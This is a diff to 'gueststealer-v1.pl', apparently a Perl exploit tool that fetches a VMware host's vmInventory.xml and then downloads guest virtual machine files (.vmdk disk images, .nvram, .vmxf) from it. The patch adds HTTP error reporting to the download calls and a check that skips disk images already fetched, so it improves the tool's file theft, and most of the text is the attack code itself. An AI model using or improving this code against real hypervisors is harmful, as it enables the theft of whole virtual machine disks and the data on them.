@@ -1,0 +1,65 @@
+--- gueststealer-v1.pl	2010-02-17 14:20:48.315355148 -0600
++++ gueststealer-v1-fixed.pl	2010-02-17 14:36:54.905380569 -0600
+@@ -135,8 +135,9 @@
+ 
+ # Obtain the inventory of Virtual Machines. If it can not grab the vmInventory.xml file, 
+ # print an error message and kill the program.
+-if (is_error(getstore($GetURL, "/tmp/vmInventory.xml"))){
+-	print "Unable to obtain the inventory of virtual machines\n";
++$err = getstore($GetURL, "/tmp/vmInventory.xml");
++if (is_error($err)){
++	print "Unable to obtain the inventory of virtual machines: HTTP $err\n";
+ 	unlink("/tmp/vmInventory.xml");
+ 	exit 1;
+ }
+@@ -274,17 +275,37 @@
+ # Steal the .vmxf
+ FetchGuests(".nvram", ".vmxf");
+ 
++# Define a list of the files we've downloaded (to prevent double downloading a file)
++%Downloaded = ();
++
+ # Steal the .vmdk(s)
+ foreach (@Images) {
+ 	$VmdkName = $_;
+ 	$StealURL = $PwnURL . $TargetPath . $VmdkName;
++
+ 	$VmdkNameClean = $VmdkName;
+ 	$VmdkNameClean =~ s/%20/ /g;	
+ 	print "\nStealing $VmdkNameClean...";
++
++	# Check if the file already exists
++	if(exists($Downloaded{$StealURL}))
++	{
++		print "already downloaded, skipping!\n";
++		next;
++	}
++
++	# Mark the file as downloaded
++	$Downloaded{$StealURL} = 1;
++
++
+ 	#Flush the buffer before starting the download. We could be here for a while.
+ 	$| = 1;	
+-	getstore ($StealURL, "$GuestPath/$VmdkNameClean") || die "Could not steal the file!";
++	$err = getstore($StealURL, "$GuestPath/$VmdkNameClean");
++	if (is_error($err)){
++		die "Could not steal the file: HTTP $err\n";
++	}
+ 	print "Success!\n";
++
+ 	$filesize = -s "$GuestPath/$VmdkNameClean";
+ 
+ 
+@@ -357,7 +378,10 @@
+ 	#Flush the buffer before starting the download
+ 	$| = 1;	
+ 
+-	getstore ($StealURL, "$GuestPath/$TargetClean") || die "Could not steal the file!";
++	$err = getstore($StealURL, "$GuestPath/$TargetClean");
++	if (is_error($err)){
++		die "Could not steal the file: HTTP $err\n";
++	}
+ 
+ 	print "Success!\n";
+ }
